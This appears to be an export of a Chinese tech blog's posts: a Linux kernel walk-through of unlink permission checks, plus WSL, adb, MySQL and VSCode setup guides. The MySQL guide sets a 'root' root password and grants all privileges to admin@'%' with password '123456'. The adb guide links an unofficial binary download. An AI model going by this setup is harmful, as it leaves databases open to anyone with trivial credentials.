<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE3</span>(unlinkat, <span class="keyword">int</span>, dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user *, pathname, <span class="keyword">int</span>, flag)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((flag &amp; ~AT_REMOVEDIR) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flag &amp; AT_REMOVEDIR)</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">do_rmdir</span>(dfd, <span class="built_in">getname</span>(pathname));</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">do_unlinkat</span>(dfd, <span class="built_in">getname</span>(pathname));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE1</span>(unlink, <span class="keyword">const</span> <span class="keyword">char</span> __user *, pathname)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">do_unlinkat</span>(AT_FDCWD, <span class="built_in">getname</span>(pathname));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删除文件时，是调用<code>do_unlinkat</code>函数，跟踪内部第一个函数<code>filename_parentat</code>的调用链：<code>path_parentat</code>-<code>link_path_walk</code>-<code>may_lookup</code>-<code>inode_permission</code></p>
<p>调用<code>inode_permission</code>时传入了<code>MAY_EXEC</code>，如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">may_lookup</span><span class="params">(struct user_namespace *mnt_userns,</span></span></span><br><span class="line"><span class="params"><span class="function">			     struct nameidata *nd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nd-&gt;flags &amp; LOOKUP_RCU) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = <span class="built_in">inode_permission</span>(mnt_userns, nd-&gt;inode, MAY_EXEC|MAY_NOT_BLOCK);</span><br><span class="line">		<span class="keyword">if</span> (err != -ECHILD || !<span class="built_in">try_to_unlazy</span>(nd))</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">inode_permission</span>(mnt_userns, nd-&gt;inode, MAY_EXEC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>MAY_EXEC</code>定义于<a href="https://github.com/torvalds/linux/blob/79160a603bdb51916226caf4a6616cc4e1c58a58/include/linux/fs.h">include/linux/fs.h</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_EXEC		0x00000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_WRITE		0x00000002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_READ		0x00000004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_APPEND		0x00000008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_ACCESS		0x00000010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_OPEN		0x00000020</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_CHDIR		0x00000040</span></span><br><span class="line"><span class="comment">/* called from RCU mode, don&#x27;t block */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAY_NOT_BLOCK		0x00000080</span></span><br></pre></td></tr></table></figure>

<p>可以看到是通过调用<code>inode_permission</code>函数，对可执行权限进行判断，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inode_permission</span><span class="params">(struct user_namespace *mnt_userns,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct inode *inode, <span class="keyword">int</span> mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">	retval = <span class="built_in">sb_permission</span>(inode-&gt;i_sb, inode, mask);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(mask &amp; MAY_WRITE)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Nobody gets write access to an immutable file.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">IS_IMMUTABLE</span>(inode))</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Updating mtime will likely cause i_uid and i_gid to be</span></span><br><span class="line"><span class="comment">		 * written back improperly if their true value is unknown</span></span><br><span class="line"><span class="comment">		 * to the vfs.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">HAS_UNMAPPED_ID</span>(mnt_userns, inode))</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retval = <span class="built_in">do_inode_permission</span>(mnt_userns, inode, mask);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	retval = <span class="built_in">devcgroup_inode_permission</span>(inode, mask);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">security_inode_permission</span>(inode, mask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EXPORT_SYMBOL</span>(inode_permission);</span><br></pre></td></tr></table></figure>
<p>查看<code>do_inode_permission</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">do_inode_permission</span><span class="params">(struct user_namespace *mnt_userns,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct inode *inode, <span class="keyword">int</span> mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!(inode-&gt;i_opflags &amp; IOP_FASTPERM))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">likely</span>(inode-&gt;i_op-&gt;permission))</span><br><span class="line">			<span class="keyword">return</span> inode-&gt;i_op-&gt;<span class="built_in">permission</span>(mnt_userns, inode, mask);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* This gets set once for the inode lifetime */</span></span><br><span class="line">		<span class="built_in">spin_lock</span>(&amp;inode-&gt;i_lock);</span><br><span class="line">		inode-&gt;i_opflags |= IOP_FASTPERM;</span><br><span class="line">		<span class="built_in">spin_unlock</span>(&amp;inode-&gt;i_lock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">generic_permission</span>(mnt_userns, inode, mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终调用<code>generic_permission</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">generic_permission</span><span class="params">(struct user_namespace *mnt_userns, struct inode *inode,</span></span></span><br><span class="line"><span class="params"><span class="function">		       <span class="keyword">int</span> mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Do the basic permission checks.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ret = <span class="built_in">acl_permission_check</span>(mnt_userns, inode, mask);</span><br><span class="line">	<span class="keyword">if</span> (ret != -EACCES)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">S_ISDIR</span>(inode-&gt;i_mode)) &#123;</span><br><span class="line">		<span class="comment">/* DACs are overridable for directories */</span></span><br><span class="line">		<span class="keyword">if</span> (!(mask &amp; MAY_WRITE))</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">capable_wrt_inode_uidgid</span>(mnt_userns, inode,</span><br><span class="line">						     CAP_DAC_READ_SEARCH))</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">capable_wrt_inode_uidgid</span>(mnt_userns, inode,</span><br><span class="line">					     CAP_DAC_OVERRIDE))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Searching includes executable on directories, else just read.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	mask &amp;= MAY_READ | MAY_WRITE | MAY_EXEC;</span><br><span class="line">	<span class="keyword">if</span> (mask == MAY_READ)</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">capable_wrt_inode_uidgid</span>(mnt_userns, inode,</span><br><span class="line">					     CAP_DAC_READ_SEARCH))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Read/write DACs are always overridable.</span></span><br><span class="line"><span class="comment">	 * Executable DACs are overridable when there is</span></span><br><span class="line"><span class="comment">	 * at least one exec bit set.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(mask &amp; MAY_EXEC) || (inode-&gt;i_mode &amp; S_IXUGO))</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">capable_wrt_inode_uidgid</span>(mnt_userns, inode,</span><br><span class="line">					     CAP_DAC_OVERRIDE))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EXPORT_SYMBOL</span>(generic_permission);</span><br></pre></td></tr></table></figure>
<p>看到注释<code>Searching includes executable on directories, else just read.</code></p>
<p>（具体是不是这里检测，并不是非常确定，还有待进一步调试内核）</p>
<p>PS：<code>capable_wrt_inode_uidgid</code>函数用于判断用户是否具有忽略DAC访问限制的能力，详见<a href="https://www.cnblogs.com/iamfy/archive/2012/09/20/2694977.html">[转载] Linux的capability深入分析</a></p>
<blockquote>
<p>CAP_DAC_OVERRIDE 1 忽略对文件的所有DAC访问限制<br>CAP_DAC_READ_SEARCH 2 忽略所有对读、搜索操作的限制 </p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://askubuntu.com/questions/862289/difference-between-executable-directory-vs-executable-files">Difference between executable directory vs executable files</a><br><a href="https://stackoverflow.com/questions/54622606/what-permissions-are-needed-to-delete-a-file-in-unix">What permissions are needed to delete a file in unix?</a><br><a href="https://www.linuxquestions.org/questions/linux-software-2/where-can-i-get-the-source-code-of-rm-command-754249/">Where can i get the source code of rm command</a><br><a href="https://www.cnblogs.com/lwyeric/p/13603959.html">Linux删除文件过程解析</a><br><a href="https://www.cnblogs.com/iamfy/archive/2012/09/20/2694977.html">[转载] Linux的capability深入分析</a></p>
]]></content>
      <tags>
        <tag>Kernel</tag>
        <tag>Linux</tag>
        <tag>源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>win10 切换诊断数据为完整</title>
    <url>/2020/04/15/win10-open-diagtask-for-inside/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>安装windows预览版，需要切换诊断数据为<code>完整</code>，而切换到<code>完整</code>后又会自动跳回<code>基本</code>。搜索后找到解决方案。<br>原因是<code>Connected User Experiences and Telemetry</code>服务被禁用</p>
<h2 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h2><p>Win+R,<code>services.msc</code>,找到<code>Connected User Experiences and Telemetry</code>，设置为<code>自动(延迟启动)</code>，再点击启动此服务即可成功切换</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tieba.baidu.com/p/6483106526">安装win10预览版，诊断数据无设置成完整</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL(Ubuntu 18.04)编译安卓6.0.0_r1源码</title>
    <url>/2020/04/14/wsl-18-04-android-6-source/</url>
    <content><![CDATA[<h2 id="之前的尝试"><a href="#之前的尝试" class="headerlink" title="之前的尝试"></a>之前的尝试</h2><p>一开始使用wsl1进行编译，即使用了ccache，编译耗时仍难以接受（编译了很久都没结束）<br>之后又使用wsl2进行编译，编译还是需要很久<br>原因猜测：源码位于D盘，wsl访问文件可能需要经过转换，因此IO操作速度慢。<br>搜索发现<a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-ux-changes">WSL 1 与 WSL 2 之间的用户体验更改</a>中提到：</p>
<blockquote>
<p>请确保将你要使用 Linux 应用程序频繁访问的文件放在 Linux 根文件系统中，以享受文件性能优势。 这些文件必须位于 Linux 根文件系统内，以便较快地访问文件系统。<br>验证：使用wsl在d盘解压源码，速度远慢于直接在wsl文件系统中解压<br>由此确定最终方案</p>
</blockquote>
<h2 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h2><p>将源码压缩包移动到linux文件系统下，再解压<br>或者使用repo工具下载源码到linux文件系统</p>
<span id="more"></span>
<h2 id="方法一-使用docker-aosp-建议"><a href="#方法一-使用docker-aosp-建议" class="headerlink" title="方法一 使用docker-aosp(建议)"></a>方法一 使用docker-aosp(建议)</h2><p>见<a href="https://blog.xhyeax.com/2020/04/16/aosp-docker/">使用docker编译安卓源码</a></p>
<h2 id="方法二-直接使用wsl系统进行编译"><a href="#方法二-直接使用wsl系统进行编译" class="headerlink" title="方法二 直接使用wsl系统进行编译"></a>方法二 直接使用wsl系统进行编译</h2><p>如果使用wsl2，步骤与<a href="https://blog.xhyeax.com/2019/12/29/ubuntu-1910-android-6-source/">Ubuntu 19.10 编译安卓6.0.0_r1源码</a>一致<br>wsl1则需要先进行以下配置</p>
<h2 id="wsl1需要进行的操作"><a href="#wsl1需要进行的操作" class="headerlink" title="wsl1需要进行的操作"></a>wsl1需要进行的操作</h2><h3 id="配置大小写敏感"><a href="#配置大小写敏感" class="headerlink" title="配置大小写敏感"></a>配置大小写敏感</h3><h4 id="方法一-配置wsl自动挂载"><a href="#方法一-配置wsl自动挂载" class="headerlink" title="方法一 配置wsl自动挂载"></a>方法一 配置wsl自动挂载</h4><p>编辑<code>/etc/wsl.conf</code>，写入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[automount]</span><br><span class="line">enabled = true</span><br><span class="line">options = &quot;metadata,umask=0000,uid=0,gid=0,case=force&quot;</span><br><span class="line">mountFsTab = false</span><br></pre></td></tr></table></figure>
<p>保存后重启PC</p>
<h4 id="方法二-指定文件夹"><a href="#方法二-指定文件夹" class="headerlink" title="方法二 指定文件夹"></a>方法二 指定文件夹</h4><p><code>Win+X</code>,打开PowerShell(管理员)<br>执行（<code>D:\AOSP</code>替换为源码将要被解压的目录）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fsutil.exe file setCaseSensitiveInfo D:\AOSP enable</span><br></pre></td></tr></table></figure>
<p>注意：<strong>必须使用管理员权限执行该命令</strong></p>
<h3 id="使bash支持32位程序运行"><a href="#使bash支持32位程序运行" class="headerlink" title="使bash支持32位程序运行"></a>使bash支持32位程序运行</h3><p>如果报错：<code>cannot execute binary file: Exec format error</code>，说明运行了32位程序。</p>
<h3 id="方法一-使用binfmt"><a href="#方法一-使用binfmt" class="headerlink" title="方法一 使用binfmt"></a>方法一 使用binfmt</h3><h4 id="安装qemu并设置binfmt"><a href="#安装qemu并设置binfmt" class="headerlink" title="安装qemu并设置binfmt"></a>安装qemu并设置binfmt</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
<h4 id="设置binfmt"><a href="#设置binfmt" class="headerlink" title="设置binfmt"></a>设置binfmt</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic &#x27;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&#x27; --mask &#x27;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service binfmt-support start</span><br></pre></td></tr></table></figure>
<p>注意：<strong>binfmt服务在每次启动bash控制台时都需要启动</strong>，否则在运行32位程序时会报错<code>cannot execute binary file: Exec format error</code><br>PS：可以实现自启动该服务</p>
<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;Hello world!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o hello hello.c -m32</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>使用系统自带的程序覆盖32位程序（哪个文件报错就替换哪个）</p>
<blockquote>
<p>报错&lt;1&gt;：bin/bash: prebuilts/misc/linux-x86/bison/bison: cannot execute binary file<br>报错原因：在x86 64位系统执行32位程序<br><code>sudo cp /usr/bin/bison prebuilts/misc/linux-x86/bison</code><br>参考：<a href="https://mp.weixin.qq.com/s/lxR3kIKHY_gshdpDVNP7OA">Win10之WSL编译Android源码</a></p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/tangjie134/article/details/102796330">Ubuntu18.04 (WSL) 编译RK3399 Android8.1源码</a><br><a href="https://blog.csdn.net/u010164190/article/details/102585931">WSL配置C/D盘大小写敏感</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL中使用adb</title>
    <url>/2020/04/14/wsl-adb/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>尝试在wsl中使用adb，发现找不到设备。搜索一番发现是因为adb版本不统一导致的。<br>注意：wsl2中adb无法查询到usb设备，可以通过使用ip地址连接(需要root权限)，或降级到wsl1</p>
<blockquote>
<p>在 WSL 2 的初始版本中，将会限制硬件访问支持，例如：你将无法访问 GPU、串行或 USB 设备。<br><a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-faq">WSL2 - 常见问题</a></p>
</blockquote>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="Linux安装adb"><a href="#Linux安装adb" class="headerlink" title="Linux安装adb"></a>Linux安装adb</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install android-tools-adb</span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="查询adb版本"><a href="#查询adb版本" class="headerlink" title="查询adb版本"></a>查询adb版本</h3><p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb version</span><br></pre></td></tr></table></figure>
<p>查看adb版本，发现windows是<code>1.0.41</code>，而WSL下是<code>1.0.39</code></p>
<h3 id="停用adb服务"><a href="#停用adb服务" class="headerlink" title="停用adb服务"></a>停用adb服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb kill-server</span><br></pre></td></tr></table></figure>
<h3 id="统一版本"><a href="#统一版本" class="headerlink" title="统一版本"></a>统一版本</h3><p>个人是把windows的adb文件替换为<code>1.0.39</code>版本，从而实现内外都可使用adb命令。</p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://pan.baidu.com/s/1j8IKIyiIpVhqrPEKveJAGA">https://pan.baidu.com/s/1j8IKIyiIpVhqrPEKveJAGA</a> 提取码: 2333</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_42600072/article/details/103129441"></a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL安装并运行MySQL Server</title>
    <url>/2019/11/04/wsl-install-mysql/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br><span class="line">apt-get install mariadb-client</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br></pre></td></tr></table></figure>
<h2 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h2><p><code>sudo service mysql start</code>启动服务<br>然后执行<code>ps -aux | grep mysql</code>可以得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 --log-syslog=1 --log-syslog-facility=daemon --log-syslog-tag=</span><br></pre></td></tr></table></figure>
<p>启动服务时可能会报错：<code>No directory, logging in with HOME=/</code><br>需要设置一下权限，再重新启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service mysql stop</span><br><span class="line">sudo usermod -d /var/lib/mysql/ mysql</span><br><span class="line">sudo service mysql start</span><br></pre></td></tr></table></figure>
<h2 id="允许windows访问数据库"><a href="#允许windows访问数据库" class="headerlink" title="允许windows访问数据库"></a>允许windows访问数据库</h2><p>设置root账户密码并登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root password root</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<p>给予admin用户访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>
<p>执行<code>sudo service mysql restart</code>即可使用<code>admin@localhost</code>登陆服务器</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/fu-yong/p/9025576.html">Linux上安装MySQL及其基础配置</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode 按时间排序</title>
    <url>/2021/12/07/vscode-sort-by-time/</url>
    <content><![CDATA[<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><code>VSCode</code>只能配置按更改时间排序，不能按创建时间排序</p>
<p>目前笔者的解决方案是：通过python调用系统API，把文件的创建时间赋值给更改时间（不使用git的话，会丢失文件本身的修改时间）</p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="法1-手动设置"><a href="#法1-手动设置" class="headerlink" title="法1 手动设置"></a>法1 手动设置</h3><p><code>设置</code>，搜索<code>sortOrder</code>，修改<code>Explorer: Sort Order</code></p>
<h3 id="法2-配置文件"><a href="#法2-配置文件" class="headerlink" title="法2 配置文件"></a>法2 配置文件</h3><p>创建<code>.vscode</code>文件夹，增加<code>settings.json</code>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;explorer.sortOrder&quot;</span>: <span class="string">&quot;modified&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>迁移WSL至非系统盘</title>
    <url>/2020/04/15/wsl-move-to-non-os-disk/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>由于要在WSL中使用Docker，系统盘空间不足，故迁移WSL到D盘</p>
<h2 id="迁移步骤"><a href="#迁移步骤" class="headerlink" title="迁移步骤"></a>迁移步骤</h2><h3 id="删除temp文件夹"><a href="#删除temp文件夹" class="headerlink" title="删除temp文件夹"></a>删除temp文件夹</h3><p>打开wsl文件夹：<br><code>C:\Users\用户名\AppData\Local\Packages\WSL文件夹\LocalState</code><br>WSL文件夹名：<br>Ubuntu ：<code>CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc</code><br>Ubuntu 18.04 LTS：<code>CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc</code><br>Kali Linux：<code>KaliLinux.54290C8133FEE_ey8k8hqnwqnmg</code><br>删除temp文件夹</p>
<h3 id="（可选操作）"><a href="#（可选操作）" class="headerlink" title="（可选操作）"></a>（可选操作）</h3><p>也可以先转换为wsl2再进行迁移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version Ubuntu 2</span><br></pre></td></tr></table></figure>
<p>如果提示：<code>没有收到虚拟机或容器的回应，操作超时。</code><br>则需要先取消<code>C:\Users\用户名\AppData\Local\Packages\WSL文件夹\LocalState</code>的<code>压缩内容以便节省磁盘空间</code>选项（右键属性-高级，同时应用于子文件夹）</p>
<h3 id="停止正在运行的wsl"><a href="#停止正在运行的wsl" class="headerlink" title="停止正在运行的wsl"></a>停止正在运行的wsl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
<h3 id="使用工具迁移"><a href="#使用工具迁移" class="headerlink" title="使用工具迁移"></a>使用工具迁移</h3><p>下载<a href="https://github.com/DDoSolitary/LxRunOffline/releases">https://github.com/DDoSolitary/LxRunOffline/releases</a>并解压<br>然后以管理员权限启动PowerShell，切换到该目录</p>
<h4 id="查看发行版本"><a href="#查看发行版本" class="headerlink" title="查看发行版本"></a>查看发行版本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\LxRunOffline.exe list</span><br></pre></td></tr></table></figure>
<h4 id="执行迁移操作"><a href="#执行迁移操作" class="headerlink" title="执行迁移操作"></a>执行迁移操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\LxRunOffline.exe move -n Ubuntu -d D:\Ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查询迁移结果"><a href="#查询迁移结果" class="headerlink" title="查询迁移结果"></a>查询迁移结果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./LxRunOffline.exe get-dir -n Ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="启动wsl测试"><a href="#启动wsl测试" class="headerlink" title="启动wsl测试"></a>启动wsl测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/tonydz0523/article/details/103443768">搞机：window10安装Linux子系统（WSL）及迁移到非系统盘</a></p>
]]></content>
      <tags>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>win10 WSL转换为WSL2</title>
    <url>/2020/04/15/wsl-to-wsl2/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>win10系统，操作系统版本大于等于18917</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="启用虚拟机平台和-Linux-子系统功能"><a href="#启用虚拟机平台和-Linux-子系统功能" class="headerlink" title="启用虚拟机平台和 Linux 子系统功能"></a>启用虚拟机平台和 Linux 子系统功能</h3><p>以管理员权限启动 PowerShell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure>
<h3 id="更新内核组件"><a href="#更新内核组件" class="headerlink" title="更新内核组件"></a>更新内核组件</h3><p>前往<a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-kernel">https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-kernel</a>下载内核更新包并安装<br>x64的更新包下载：<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi</a></p>
